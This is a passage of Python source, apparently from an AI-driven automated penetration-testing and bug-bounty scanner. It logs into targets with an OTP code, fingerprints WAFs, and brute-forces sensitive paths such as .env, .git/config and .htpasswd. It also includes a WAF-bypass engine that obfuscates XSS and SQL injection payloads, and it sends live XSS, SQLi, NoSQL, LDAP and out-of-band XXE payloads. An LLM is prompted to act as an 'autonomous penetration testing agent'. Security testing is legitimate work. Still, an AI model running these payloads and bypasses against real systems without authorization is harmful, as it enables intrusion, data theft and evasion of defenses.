                pool.client.headers['Cookie'] = cookies
            if bearer_token:
                pool.client.headers['Authorization'] = 'Bearer ' + bearer_token
            if headers:
                for _k, _v in (headers or {}).items():
                    pool.client.headers[str(_k)] = str(_v)
            if proxy:
                try:
                    pool.client.proxies = {'http': proxy, 'https': proxy}
                except Exception as _pe:
                    log.warning('proxy_set_failed', error=str(_pe))
            cfg.http_method = (method or 'GET').upper()
            cfg.post_data = post_data or ''
            cfg.post_json = post_json or ''
            # ============================================================
            # Two-Step Login (username/password â†’ optional OTP)
            # ============================================================
            if login_url and username and password:
                try:
                    # --- Step 1: Send username + password ---
                    _login_data = {'username': username, 'password': password}
                    _login = await pool.send('POST', login_url, data=_login_data)
                    log.info('login_step1_sent', status=_login.status, url=login_url)

                    # --- Step 2: Detect OTP page in response ---
                    needs_otp = False
                    otp_url = login_url

                    if sms_code:
                        body_lower = (_login.text or '').lower()

                        # OTP indicators in body
                        otp_indicators = [
                            'sms', 'otp', 'verification code', 'verification_code',
                            'enter the code', '2fa', 'two-factor', 'two_factor',
                            'one-time', 'one_time', 'authentication code',
                            'Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚', 'Ø§Ù„ØªØ­Ù‚Ù‚', 'ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚', 'Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù†ØµÙŠØ©',
                        ]

                        if any(ind in body_lower for ind in otp_indicators):
                            needs_otp = True
                            log.info('otp_page_detected', url=otp_url, source='body')

                        # OTP indicators in redirect Location
                        if not needs_otp:
                            _loc = ''
                            for _h in ('Location', 'location'):
                                if _h in _login.headers:
                                    _loc = _login.headers[_h]
                                    break
                            if _loc and any(ind in _loc.lower() for ind in otp_indicators):
                                needs_otp = True
                                if _loc.startswith('http'):
                                    otp_url = _loc
                                else:
                                    from urllib.parse import urljoin as _urljoin
                                    otp_url = _urljoin(login_url, _loc)
                                log.info('otp_page_detected', url=otp_url, source='redirect')

                        # Heuristic: short response with form + no dashboard keywords
                        if not needs_otp:
                            if '<form' in body_lower and len(body_lower) < 20000:
                                has_dashboard = any(k in body_lower for k in
                                    ['dashboard', 'logout', 'signout', 'profile', 'my account'])
                                if not has_dashboard:
                                    # Likely still on login or OTP page
                                    needs_otp = True
                                    log.info('otp_page_heuristic', url=otp_url)

                    # --- Step 3: Send sms_code in separate request ---
                    if needs_otp and sms_code:
                        otp_payload = {
                            'sms_code': sms_code,
                            'otp': sms_code,
                            'code': sms_code,
                            'verification_code': sms_code,
                            'two_factor_code': sms_code,
                            'two_factor_authentication_code': sms_code,
                            'token': sms_code,
                            'auth_code': sms_code,
                        }
                        _otp_resp = await pool.send('POST', otp_url, data=otp_payload)
                        log.info('login_step2_otp_sent', status=_otp_resp.status, url=otp_url)

                        # Check OTP success
                        _otp_body = (_otp_resp.text or '').lower()
                        if 'invalid' in _otp_body or 'incorrect' in _otp_body or 'wrong' in _otp_body:
                            log.warning('otp_maybe_rejected', url=otp_url)
                        else:
                            log.info('otp_step_completed', url=otp_url)

                    elif sms_code and not needs_otp:
                        # No OTP page detected â€” still send sms_code as fallback (single-page OTP)
                        fallback_data = {'username': username, 'password': password, 'sms_code': sms_code, 'otp': sms_code}
                        _fb = await pool.send('POST', login_url, data=fallback_data)
                        log.info('login_single_page_otp_sent', status=_fb.status, url=login_url)

                except Exception as _le:
                    log.warning('login_failed', error=str(_le))

            # WAF Detection (enhanced)
            try:
                waf_detector = WAFDetector(pool)
                waf_info = await waf_detector.detect(target)
                waf = waf_info.get("waf")
                summary["waf"] = waf
                summary["waf_info"] = waf_info
                log.info("waf_scan_complete", waf=waf, detected=waf_info.get("detected"))
            except Exception as waf_exc:
                log.warning("waf_detection_failed", error=str(waf_exc))
                waf = None
                summary["waf"] = None

            fp = await fingerprint(pool, target)
            crawl_result = await crawl(pool, target, max_pages=min(20, budget // 2))
            summary["fingerprint"] = fp
            summary["crawl"] = crawl_result

            # Enhanced AI Plan
            system_prompt = "You are an autonomous penetration testing agent. Respond with valid JSON only. Be specific and actionable."

            context = {
                "target": target,
                "waf": waf,
                "fingerprint": fp,
                "crawl": {
                    "pages_visited": crawl_result["pages_visited"],
                    "endpoints_count": len(crawl_result["endpoints"]),
                    "forms_count": len(crawl_result["forms"]),
                    "js_files_count": len(crawl_result["js_files"]),
                    "sample_endpoints": crawl_result["endpoints"][:10],
                    "forms": crawl_result["forms"][:5],
                },
            }

            if multi_turn:
                plan = await ai.multi_turn_plan(system_prompt, context, turns=3)
            else:
                user_prompt = json.dumps(context, ensure_ascii=False, indent=2)
                if enable_thinking:
                    plan = await ai.think_with_extended_reasoning(system_prompt, user_prompt)
                else:
                    plan = await ai.think(system_prompt, user_prompt)

            log.info("ai_plan_received", plan_keys=list(plan.keys()) if isinstance(plan, dict) else "invalid")
            summary["ai_plan"] = plan

            # Stage 7: Hidden path discovery
            hidden_results = []
            try:
                hidden_budget = min(60, max(20, budget // 3))
                hidden_results = await run_hidden_discovery(pool, target, max_requests=hidden_budget)
                summary["hidden_paths"] = hidden_results
            except Exception as h_exc:
                log.warning("hidden_scan_failed", error=str(h_exc))

            # Vuln tests (with WAF-aware bypass)
            waf_detected = bool(waf)
            findings = await run_vulnerability_tests_v2(pool, crawl_result, plan, oast, waf_detected=waf_detected)
            all_findings.extend(findings)
            # Stage 9.5: ADVANCED DATABASE ATTACKS
            try:
                from nightfall_db_attacks import run_db_advanced_tests
                db_advanced = await run_db_advanced_tests(pool, crawl_result, oast)
                all_findings.extend(db_advanced)
                log.info("db_advanced_complete", findings=len(db_advanced))
            except Exception as db_exc:
                log.warning("db_advanced_failed", error=str(db_exc))

            # Stage 9.6: ADVANCED SERVER-SIDE ATTACKS
            try:
                from nightfall_server_attacks import run_server_advanced_tests
                server_advanced = await run_server_advanced_tests(pool, crawl_result, oast)
                all_findings.extend(server_advanced)
                log.info("server_advanced_complete", findings=len(server_advanced))
            except Exception as svr_exc:
                log.warning("server_advanced_failed", error=str(svr_exc))

    finally:
        if oast_started:
            oast.stop()

    # Compute final stats
    elapsed = round(time.monotonic() - start, 2)
    summary["elapsed_seconds"] = elapsed
    summary["budget_used"] = pool.request_count
    summary["ai_calls"] = ai.call_count
    summary["ai_tokens"] = ai.total_tokens
    summary["findings_count"] = len(all_findings)
    summary["status"] = "completed"

    # Save to DB
    scan_id = db.save_scan(summary, all_findings)
    summary["scan_id"] = scan_id

    report_path = render_report(all_findings, summary, cfg.output_dir)
    summary["report_path"] = report_path

    # Stage 10: Bug Bounty reports
    bug_bounty_paths = []
    if all_findings:
        try:
            bug_bounty_paths = await generate_bug_bounty_reports(scan_id, all_findings, "bug_bounty_reports")
            summary["bug_bounty_reports"] = bug_bounty_paths
            log.info("bug_bounty_reports_generated", count=len(bug_bounty_paths))
        except Exception as bb_exc:
            log.warning("bug_bounty_reports_failed", error=str(bb_exc))

    log.info("scan_v5_complete", elapsed=elapsed, requests=pool.request_count,
             findings=len(all_findings), scan_id=scan_id, ai_calls=ai.call_count,
             bug_bounty_reports=len(bug_bounty_paths))
    return summary





# ============================================================
# Stage 7: Hidden Path Discovery
# ============================================================

class HiddenPathScanner:
    """Discovers hidden directories, files, and endpoints."""

    DEFAULT_WORDS = [
        "admin", "administrator", "login", "logout", "register",
        "api", "api/v1", "api/v2", "api/v3", "api/docs", "swagger",
        "backup", "backups", "config", "configuration", "settings",
        "test", "tests", "dev", "development", "staging", "stage",
        "private", "internal", "hidden", "secret", "secrets",
        "robots.txt", "sitemap.xml", "sitemap_index.xml",
        "security.txt", ".well-known/security.txt",
        "crossdomain.xml", "clientaccesspolicy.xml",
        ".env", ".env.bak", ".env.local", ".env.production",
        ".git/HEAD", ".git/config", ".gitignore", ".svn", ".hg",
        ".htaccess", ".htpasswd", ".netrc", ".bash_history", ".zshrc",
        "web.config", "web.config.bak", "app.config",
        "config.json", "config.yml", "config.yaml", "settings.json",
        "phpinfo.php", "info.php", "test.php",
        "index.php", "index.html", "home", "main",
        "uploads", "files", "static", "assets", "images",
        "old", "new", "temp", "tmp", "cache", "logs",
        "wp-admin", "wp-login.php", "wp-content", "wp-config.php",
        "server-status", "server-info",
    ]

    def __init__(self, pool, wordlist_path=None, max_requests=200, recursion_depth=1):
        self.pool = pool
        self.max_requests = max_requests
        self.recursion_depth = recursion_depth
        self.wordlist = self._load_wordlist(wordlist_path)

    def _load_wordlist(self, path):
        if path and os.path.exists(path):
            try:
                with open(path, encoding="utf-8", errors="replace") as f:
                    custom = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                return list(dict.fromkeys(self.DEFAULT_WORDS + custom))
            except Exception:
                pass
        return self.DEFAULT_WORDS

    async def scan(self, base_url):
        findings = []
        base_url = base_url.rstrip("/")
        tested = 0
        for path in self.wordlist:
            if tested >= self.max_requests or self.pool.request_count >= self.pool.config.budget:
                break
            url = f"{base_url}/{path}"
            try:
                resp = await self.pool.send("GET", url)
                tested += 1
                if resp.status == 200 and len(resp.text) > 0:
                    findings.append({
                        "status": resp.status,
                        "path": path,
                        "size": len(resp.text),
                        "type": self._classify(path, resp),
                    })
                    log.info("hidden_path_found", path=path, status=resp.status, size=len(resp.text))
            except Exception:
                continue
        log.info("hidden_scan_complete", tested=tested, found=len(findings))
        return findings

    def _classify(self, path, resp):
        p = path.lower()
        if any(x in p for x in ["admin", "administrator", "wp-admin"]):
            return "admin_panel"
        if any(x in p for x in [".env", ".git", ".htpasswd", ".netrc", "secrets"]):
            return "critical_exposure"
        if any(x in p for x in ["config", "settings", ".htaccess", "web.config"]):
            return "sensitive_file"
        if any(x in p for x in ["robots.txt", "sitemap", "security.txt"]):
            return "reconnaissance"
        if "api" in p or "swagger" in p:
            return "api_doc"
        return "other"


async def run_hidden_discovery(pool, base_url, wordlist_path=None, max_requests=200):
    scanner = HiddenPathScanner(pool, wordlist_path, max_requests)
    return await scanner.scan(base_url)


# ============================================================
# Stage 8: WAF Detection + Bypass Engine
# ============================================================

class WAFDetector:
    """Detects WAF via server header and probes."""

    SIGNATURES = [
        ("Cloudflare", ["cloudflare"], ["cf-ray", "cf-cache-status"]),
        ("Akamai", ["akamai"], ["x-akamai-transformed", "akamai-grn"]),
        ("AWS WAF", ["awselb", "aws-waf"], ["x-amzn-requestid", "x-amz-cf-id"]),
        ("Sucuri", ["sucuri"], ["x-sucuri-id", "x-sucuri-cache"]),
        ("Imperva", ["incapsula", "imperva"], ["x-iinfo"]),
        ("F5 BIG-IP", ["big-ip", "f5"], ["x-wa-info"]),
        ("Barracuda", ["barracuda"], ["barra_counter_session"]),
        ("ModSecurity", ["mod_security", "modsecurity"], []),
        ("Wordfence", ["wordfence"], ["x-wordfence"]),
        ("Fortinet", ["fortiweb", "fortigate"], []),
        ("Citrix NetScaler", ["netscaler", "citrix"], []),
        ("Fastly", ["fastly"], ["x-served-by", "x-fastly-request-id"]),
        ("Varnish", ["varnish"], ["x-varnish"]),
    ]

    def __init__(self, pool):
        self.pool = pool

    async def detect(self, base_url):
        signals = []
        waf_name = None
        try:
            resp = await self.pool.send("GET", base_url)
            headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            server = headers_lower.get("server", "").lower()
            for name, server_sigs, header_sigs in self.SIGNATURES:
                matched = False
                for sig in server_sigs:
                    if sig in server:
                        matched = True
                        break
                if not matched:
                    for sig in header_sigs:
                        if sig in headers_lower:
                            matched = True
                            signals.append({"source": f"header:{sig}", "pattern": headers_lower[sig][:80]})
                            break
                if matched:
                    waf_name = name
                    break
        except Exception:
            pass
        return {
            "waf": waf_name,
            "detected": bool(waf_name),
            "probes_sent": 1,
            "triggered_probes": 0,
            "signals": signals,
        }


class WAFBypassEngine:
    """Generates WAF bypass payload variants."""

    @staticmethod
    def url_encode(payload, safe=""):
        from urllib.parse import quote
        return quote(payload, safe=safe)

    @staticmethod
    def double_url_encode(payload):
        from urllib.parse import quote
        return quote(quote(payload, safe=""), safe="")

    @staticmethod
    def html_entity(payload):
        return "".join(f"&#{ord(c)};" for c in payload)

    @staticmethod
    def html_hex(payload):
        return "".join(f"&#x{ord(c):x};" for c in payload)

    @staticmethod
    def unicode_escape(payload):
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def mixed_case(payload):
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))

    @staticmethod
    def random_case(payload):
        import random
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

    @staticmethod
    def sql_comment(payload):
        return payload.replace(" ", "/**/")

    @staticmethod
    def sql_comment_inline(payload):
        return payload.replace(" ", "/*!*/")

    @staticmethod
    def null_byte(payload):
        return payload + "%00"

    @staticmethod
    def newline_injection(payload):
        return payload.replace(" ", "%0a")

    @staticmethod
    def tab_injection(payload):
        return payload.replace(" ", "%09")

    @staticmethod
    def crlf_injection(payload):
        return payload.replace(" ", "%0d%0a")

    @staticmethod
    def fullwidth(payload):
        return "".join(chr(ord(c) + 0xFEE0) if c.isascii() and c.isalnum() else c for c in payload)

    @staticmethod
    def overlong_utf8(payload):
        return payload.replace("<", "%c0%bc").replace(">", "%c0%be")

    @classmethod
    def generate_bypasses(cls, payload, vuln_class="xss", depth=1):
        variants = [payload]
        if vuln_class == "xss":
            variants.extend([
                cls.url_encode(payload),
                cls.double_url_encode(payload),
                cls.html_entity(payload),
                cls.html_hex(payload),
                cls.mixed_case(payload),
                cls.random_case(payload),
                cls.overlong_utf8(payload),
            ])
        elif vuln_class == "sqli":
            variants.extend([
                cls.sql_comment(payload),
                cls.sql_comment_inline(payload),
                cls.mixed_case(payload),
                cls.url_encode(payload),
                cls.double_url_encode(payload),
                cls.null_byte(payload),
            ])
        elif vuln_class == "path_traversal":
            variants.extend([
                cls.url_encode(payload),
                cls.double_url_encode(payload),
                cls.unicode_escape(payload),
            ])
        return list(dict.fromkeys(variants))[:8]


async def test_xss_with_waf_bypass(pool, endpoint, params, waf_detected=False):
    """XSS test with WAF bypass variants (framework helpers)."""
    from framework_bridge import (
        xss_verify_reflection, xss_find_context,
    )
    from urllib.parse import quote

    findings = []
    base_payload = "<script>alert(1)</script>"
    for param in params:
        variants = (
            WAFBypassEngine.generate_bypasses(base_payload, "xss")
            if waf_detected else [base_payload]
        )
        for payload in variants:
            test_url = f"{endpoint}?{param}={quote(payload, safe='')}"
            resp = await pool.send("GET", test_url)
            if resp.status == 0:
                continue

            body = resp.text or ""
            if not xss_verify_reflection(body, payload):
                continue

            ctx = xss_find_context(body, payload) or {}

            findings.append({
                "vuln_class": "xss",
                "subtype": "reflected_waf_bypass" if waf_detected else "reflected",
                "severity": "high",
                "url": test_url,
                "injected_url": test_url,
                "param": param,
                "payload": payload,
                "context_type": ctx.get("type", "html"),
                "context_before": ctx.get("before", ""),
                "context_after": ctx.get("after", ""),
                "evidence": body[:300],
                "confidence": 0.9,
            })
            log.info("xss_found", endpoint=endpoint, param=param,
                     waf_bypass=waf_detected)
            break
    return findings

async def test_sqli_with_waf_bypass_v2(pool, endpoint, params, waf_detected=False):
    """SQLi with WAF bypass - dedicated variant using framework helpers."""
    from framework_bridge import (
        SQLI_ERROR_PAYLOADS, sqli_has_db_error, sqli_looks_like_error,
    )
    from urllib.parse import quote
    findings = []
    if not params:
        return findings
    if waf_detected:
        variants = [
            SQLI_ERROR_PAYLOADS,
            ["1'/**/OR/**/'1'='1", "1'/*!UNION*//*!SELECT*/NULL--"],
            ["%27%20OR%201=1--", "%27%20UNION%20SELECT%20NULL--"],
        ]
        flat = []
        for v in variants:
            flat.extend(v)
        variants = list(dict.fromkeys(flat))
    else:
        variants = SQLI_ERROR_PAYLOADS
    for param in params:
        for payload in variants:
            try:
                test_url = f"{endpoint}?{param}={quote(payload, safe='')}"
                resp = await pool.send("GET", test_url)
            except Exception as _e:
                log.debug("sqli_waf_failed", param=param, error=str(_e))
                continue
            if not resp or resp.status == 0:
                continue
            body = resp.text or ""
            sig = sqli_has_db_error(body)
            if not sig and resp.status == 500 and sqli_looks_like_error(body):
                sig = "HTTP 500"
            if sig:
                findings.append({
                    "vuln_class": "sqli",
                    "subtype": "error_based_waf_bypass",
                    "severity": "critical",
                    "url": test_url,
                    "injected_url": test_url,
                    "param": param,
                    "payload": payload,
                    "db_error": sig,
                    "evidence": body[:300],
                    "confidence": 0.9,
                })
                log.info("sqli_waf_found", param=param)
                break
    return findings


async def test_sqli_with_waf_bypass(pool, endpoint, params, waf_detected=False):
    findings = []
    base_payload = "' OR '1'='1"
    sql_errors = ["sql syntax", "mysql_fetch", "unclosed quotation", "postgresql", "warning: mysql"]
    for param in params:
        variants = WAFBypassEngine.generate_bypasses(base_payload, "sqli") if waf_detected else [base_payload]
        for payload in variants:
            from urllib.parse import quote
            test_url = f"{endpoint}?{param}={quote(payload)}"
            resp = await pool.send("GET", test_url)
            if resp.status == 0:
                continue
            body_lower = resp.text.lower()
            for err in sql_errors:
                if err in body_lower:
                    findings.append({
                        "vuln_class": "sqli",
                        "subtype": "error_based_waf_bypass" if waf_detected else "error_based",
                        "severity": "critical",
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "evidence": resp.text[:300],
                        "confidence": 0.9,
                    })
                    log.info("sqli_found", endpoint=endpoint, param=param, waf_bypass=waf_detected)
                    break
            else:
                continue
            break
    return findings


# ============================================================
# Stage 9: NoSQL / MongoDB / GraphQL / LDAP / XXE-OOB
# ============================================================

async def test_nosql(pool, endpoints, params=None):
    if params is None:
        params = ["id", "user", "username", "q", "search"]
    findings = []
    nosql_payloads = [
        ("[$ne]", "1"),
        ("[$gt]", ""),
        ("[$regex]", ".*"),
        ("[$where]", "1==1"),
    ]
    for endpoint in endpoints:
        for param in params:
            for key, val in nosql_payloads:
                test_url = f"{endpoint}?{param}{key}={val}"
                resp = await pool.send("GET", test_url)
                if resp.status == 0:
                    continue
                body = resp.text.lower()
                if any(x in body for x in ["mongodb", "mongo", "bson", "unknown operator"]):
                    findings.append({
                        "vuln_class": "nosql",
                        "subtype": "operator_injection",
                        "severity": "high",
                        "url": test_url,
                        "param": param,
                        "payload": f"{key}={val}",
                        "evidence": resp.text[:300],
                        "confidence": 0.75,
                    })
                    break
    return findings


async def test_mongodb_exposure(pool, base_url):
    findings = []
    base = base_url.rstrip("/")
    for path in ["/mongodb", "/mongo", "/admin/mongo", "/db/mongo"]:
        try:
            resp = await pool.send("GET", base + path)
            if resp.status == 200 and "mongo" in resp.text.lower():
                findings.append({
                    "vuln_class": "mongodb",
                    "subtype": "exposure",
                    "severity": "high",
                    "url": base + path,
                    "param": "",
                    "payload": path,
                    "evidence": resp.text[:200],
                    "confidence": 0.6,
                })
        except Exception:
            continue
    try:
        resp = await pool.send("GET", base)
        import re
        matches = re.findall(r"mongodb(\+srv)?://[^\s\"'<>]+", resp.text)
        for m in matches[:3]:
            findings.append({
                "vuln_class": "mongodb",
                "subtype": "conn_string_leak",
                "severity": "critical",
                "url": base,
                "param": "",
                "payload": m[:50] + "***",
                "evidence": "MongoDB connection string in page source",
                "confidence": 0.8,
            })
    except Exception:
        pass
    return findings


async def test_graphql(pool, endpoints):
    findings = []
    graphql_paths = ["/graphql", "/api/graphql", "/gql", "/query"]
    introspection_query = '{"query":"{__schema{types{name}}}"}'
    for path in graphql_paths:
        for endpoint in endpoints[:1]:
            from urllib.parse import urlparse
            parsed = urlparse(endpoint)
            test_url = f"{parsed.scheme}://{parsed.netloc}{path}"
            try:
                resp = await pool.send("POST", test_url, content=introspection_query,
                                        headers={"Content-Type": "application/json"})
                if resp.status == 200 and "__schema" in resp.text:
                    findings.append({
                        "vuln_class": "graphql",
                        "subtype": "introspection_enabled",
                        "severity": "medium",
                        "url": test_url,
                        "param": "query",
                        "payload": introspection_query,
                        "evidence": resp.text[:300],
                        "confidence": 0.9,
                    })
                    log.info("graphql_introspection_enabled", url=test_url)
                    break
            except Exception:
                continue
    return findings


async def test_ldap(pool, endpoints, params=None):
    if params is None:
        params = ["user", "username", "cn", "uid", "login"]
    findings = []
    ldap_payloads = ["*)(uid=*))(|(uid=*", "*)(objectClass=*", "admin*", "*"]
    ldap_errors = ["ldap_", "ldaperror", "invalid dn", "javax.naming"]
    for endpoint in endpoints:
        for param in params:
            for payload in ldap_payloads:
                from urllib.parse import quote
                test_url = f"{endpoint}?{param}={quote(payload)}"
                resp = await pool.send("GET", test_url)
                if resp.status == 0:
                    continue
                body = resp.text.lower()
                for err in ldap_errors:
                    if err in body:
                        findings.append({
                            "vuln_class": "ldap",
                            "subtype": "injection",
                            "severity": "high",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": resp.text[:300],
                            "confidence": 0.7,
                        })
                        break
    return findings


async def test_xxe_oob(pool, endpoints, oast):
    findings = []
    if not oast:
        return findings
    payload_url = oast.get_payload_url()
    xxe_payload = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "{payload_url}">]><r>&xxe;</r>'
    for endpoint in endpoints[:3]:
        try:
            resp = await pool.send("POST", endpoint, content=xxe_payload,
                                    headers={"Content-Type": "application/xml"})
            if resp.status in (200, 500):
                for _i in range(4):
                    await asyncio.sleep(0.5)
                    if oast.callbacks:
                        findings.append({
                            "vuln_class": "xxe",
                            "subtype": "oob",
                            "severity": "critical",
                            "url": endpoint,
                            "param": "XML body",
                            "payload": xxe_payload[:100],
                            "evidence": f"OAST received {len(oast.callbacks)} callbacks",
                            "confidence": 0.95,
                        })
                        log.info("xxe_oob_confirmed", endpoint=endpoint)
                        break
        except Exception:
            continue
    return findings


async def run_db_detection(pool, crawl_result, oast=None):
    all_findings = []
    endpoints = crawl_result.get("endpoints", [])
    root = ""
    for u in crawl_result.get("all_urls", []):
        if u and not u.endswith((".css", ".js", ".png", ".jpg")):
            root = u
            break
    if not root:
        return all_findings
    try:
        nosql = await test_nosql(pool, [root])
        all_findings.extend(nosql)
    except Exception as e:
        log.warning("nosql_failed", error=str(e))
    try:
        mongodb = await test_mongodb_exposure(pool, root)
        all_findings.extend(mongodb)
    except Exception as e:
        log.warning("mongodb_failed", error=str(e))
    try:
        graphql = await test_graphql(pool, [root])
        all_findings.extend(graphql)
    except Exception as e:
        log.warning("graphql_failed", error=str(e))
    try:
        ldap = await test_ldap(pool, [root])
        all_findings.extend(ldap)
    except Exception as e:
        log.warning("ldap_failed", error=str(e))
    if oast:
        try:
            xxe = await test_xxe_oob(pool, [root], oast)
            all_findings.extend(xxe)
        except Exception as e:
            log.warning("xxe_oob_failed", error=str(e))
    log.info("db_detection_complete", findings=len(all_findings))
    return all_findings


# ============================================================
# Stage 10: Bug Bounty Report Generation
# ============================================================

@dataclass
class FindingReport:
    """Structured report for bug bounty submission."""
    title: str = ""
    vuln_class: str = ""
    subtype: str = ""
    severity: str = ""
    url: str = ""
    param: str = ""
    payload: str = ""
    evidence: str = ""
    cwe: str = ""
    cvss: str = ""
    description: str = ""
    impact: str = ""
    remediation: str = ""
    steps_to_reproduce: list = field(default_factory=list)
    references: list = field(default_factory=list)


class LocalReportOrganizer:
    """Saves bug bounty reports locally as markdown."""

    def __init__(self, output_dir="bug_bounty_reports"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def finding_to_report(self, finding: dict) -> FindingReport:
        return FindingReport(
            title=f"[{finding.get('severity', 'info').upper()}] {finding.get('vuln_class', 'unknown')}",
            vuln_class=finding.get("vuln_class", ""),
            subtype=finding.get("subtype", ""),
            severity=finding.get("severity", "info"),
            url=finding.get("url", ""),
            param=finding.get("param", ""),
            payload=finding.get("payload", ""),
            evidence=finding.get("evidence", ""),
            cwe=self._class_to_cwe(finding.get("vuln_class", "")),
            cvss=self._severity_to_cvss(finding.get("severity", "info")),
            description=f"{finding.get('vuln_class', '')} vulnerability ({finding.get('subtype', '')})",
            impact=self._default_impact(finding.get("vuln_class", "")),
            remediation=self._default_remediation(finding.get("vuln_class", "")),
            steps_to_reproduce=self._generate_steps(finding),
            references=self._default_references(finding.get("vuln_class", "")),
        )

    def _severity_to_cvss(self, severity):
        return {"critical": "9.5", "high": "8.0", "medium": "5.5", "low": "3.0", "info": "0.0"}.get(
            severity.lower(), "0.0")

    def _class_to_cwe(self, vuln_class):
        return {
            "xss": "CWE-79", "sqli": "CWE-89", "ssrf": "CWE-918",
            "idor": "CWE-639", "csrf": "CWE-352", "jwt": "CWE-347",
            "xxe": "CWE-611", "ssti": "CWE-1336", "open_redirect": "CWE-601",
            "nosql": "CWE-943", "graphql": "CWE-200", "ldap": "CWE-90",
        }.get(vuln_class.lower(), "CWE-200")

    def _default_impact(self, vuln_class):
        return {
            "xss": "Arbitrary JavaScript execution in victim's browser; session hijacking.",
            "sqli": "Database compromise; potential data exfiltration.",
            "ssrf": "Access to internal services; potential cloud metadata exposure.",
            "idor": "Unauthorized access to other users' data.",
            "csrf": "State-changing actions performed without user consent.",
            "jwt": "Authentication bypass via token forgery.",
            "xxe": "File disclosure; potential SSRF.",
            "ssti": "Remote code execution via template injection.",
        }.get(vuln_class.lower(), "Potential security impact")

    def _default_remediation(self, vuln_class):
        return {
            "xss": "Encode all user input; implement Content-Security-Policy.",
            "sqli": "Use parameterized queries; validate input.",
            "ssrf": "Whitelist allowed URLs; block private IP ranges.",
            "idor": "Enforce authorization checks on every resource access.",
            "csrf": "Implement anti-CSRF tokens; use SameSite cookies.",
            "jwt": "Use strong algorithms (RS256); validate signatures.",
            "xxe": "Disable external entity processing in XML parsers.",
            "ssti": "Sandbox template engines; avoid user-controlled templates.",
        }.get(vuln_class.lower(), "Follow OWASP secure coding guidelines")

    def _generate_steps(self, finding):
        return [
            f"Navigate to {finding.get('url', '')}",
            f"Inject payload in parameter '{finding.get('param', '')}'",
            f"Use payload: {finding.get('payload', '')}",
            "Observe the response/behavior described in evidence",
        ]

    def _default_references(self, vuln_class):
        return ["https://owasp.org/www-project-top-ten/", "https://cwe.mitre.org/"]

    def save_report(self, report: FindingReport, scan_id: int, finding_id: int = 0) -> str:
        import re
        safe_class = re.sub(r"[^a-zA-Z0-9_-]", "_", report.vuln_class)
        filename = f"scan_{scan_id}_finding_{finding_id}_{safe_class}.md"
        path = os.path.join(self.output_dir, filename)
        content = self._render_markdown(report)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        return path

    def _render_markdown(self, report: FindingReport) -> str:
        """Render comprehensive finding report with PoC + remediation."""
        try:
            from core.nightfall.exploit_templates import get_template
        except ImportError:
            get_template = lambda vc: {}

        template = get_template(report.vuln_class)
        url = report.url
        param = report.param

        lines = []

        lines.append(f"# SSTI - {report.vuln_class.upper()} - {report.severity.upper()}")
        lines.append("")
        lines.append("## Summary")
        lines.append("")
        lines.append(f"| Metric | Value |")
        lines.append(f"|--------|-------|")
        lines.append(f"| Severity | {report.severity.upper()} |")
        lines.append(f"| CVSS | {report.cvss} |")
        lines.append(f"| CWE | {report.cwe} |")
        lines.append(f"| Vuln Class | {report.vuln_class} |")
        lines.append(f"| Subtype | {report.subtype or 'N/A'} |")
        lines.append("")

        lines.append("## Target")
        lines.append("")
        lines.append(f"**URL:** `{url}`")
        lines.append(f"**Parameter:** `{param}`")
        lines.append(f"**Payload:** `{report.payload}`")
        lines.append("")

        lines.append("## Explanation")
        lines.append("")
        lines.append(template.get("explanation", report.description))
        lines.append("")

        lines.append("## Impact")
        lines.append("")
        lines.append(template.get("impact", report.impact))
        lines.append("")

        lines.append("## Evidence")
        lines.append("")
        lines.append("```")
        lines.append(str(report.evidence)[:2000])
        lines.append("```")
        lines.append("")

        lines.append("## Exploitation Steps")
        lines.append("")
        steps = template.get("steps") or report.steps_to_reproduce
        for i, step in enumerate(steps, 1):
            lines.append(f"{i}. {step}")
        lines.append("")

        poc_py = template.get("poc_python")
        if poc_py:
            poc_py = poc_py.replace("{url}", url).replace("{param}", param)
            lines.append("## PoC Python")
            lines.append("")
            lines.append("```python")
            lines.append(poc_py)
            lines.append("```")
            lines.append("")

        poc_bash = template.get("poc_bash")
        if poc_bash:
            poc_bash = poc_bash.replace("{url}", url).replace("{param}", param)
            lines.append("## PoC Bash")
            lines.append("")
            lines.append("```bash")
            lines.append(poc_bash)
            lines.append("```")
            lines.append("")

        lines.append("## Remediation")
        lines.append("")
        lines.append(f"**Description:** {report.remediation}")
        lines.append("")

        rem_code = template.get("remediation_code")
        if rem_code:
            lines.append("### Fix Code")
            lines.append("")
            lines.append("```python")
            lines.append(rem_code)
            lines.append("```")
            lines.append("")

        waf = template.get("waf_rules")
        if waf:
            lines.append("### WAF Rules")
            lines.append("")
            lines.append("```")
            lines.append(waf)
            lines.append("```")
            lines.append("")

        lines.append("## References")
        lines.append("")
        refs = template.get("references") or report.references
        for r in refs:
            lines.append(f"- {r}")
        lines.append("")

        lines.append("---")
        lines.append("")
        lines.append("*Generated by Falcon MAG v2*")

        return "\n".join(lines)



async def generate_bug_bounty_reports(scan_id: int, findings: list, output_dir="bug_bounty_reports"):
    if not findings:
        return []
    organizer = LocalReportOrganizer(output_dir)
    paths = []
    for i, f in enumerate(findings[:20], 1):
        try:
            report = organizer.finding_to_report(f)
            path = organizer.save_report(report, scan_id, i)
            paths.append(path)
            log.info("bug_bounty_report_saved", path=path, vuln_class=f.get("vuln_class"))
        except Exception as e:
            log.warning("bug_bounty_report_failed", error=str(e))
    return paths